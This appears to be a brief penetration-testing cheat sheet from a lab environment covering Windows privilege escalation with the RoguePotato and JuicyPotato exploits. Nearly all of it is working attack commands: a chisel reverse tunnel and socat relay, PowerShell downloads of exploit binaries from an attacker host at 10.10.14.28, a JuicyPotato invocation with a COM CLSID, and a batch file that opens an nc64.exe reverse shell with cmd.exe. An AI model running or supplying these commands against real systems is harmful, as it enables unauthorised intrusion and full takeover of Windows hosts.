# Potatoes

setup chisel - server and client

```text
sudo ./chisel server -p 9001 --reverse

invoke-webrequest -uri 'http://10.10.14.28/chisel.exe' -outfile chisel.exe
.\chisel.exe client 10.10.14.28:9001 R:9999:127.0.0.1:9999
```

```text
socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999
```

download rogue potato to the windows box

```text
invoke-webrequest -uri 'http://10.10.14.28/RoguePotato.exe' -outfile .\rp.exe
```

### Juicy Potato

```text
.\jp.exe -t * -p "C:\users\destitute\desktop\run.bat" -l 9999 -c '{8BC3F05E-D86B-11D0-A075-00C04FB68820}'

PS C:\users\destitute\desktop> type run.bat
C:\users\destitute\desktop\nc64.exe 10.10.14.28 4243 -e cmd.exe
```

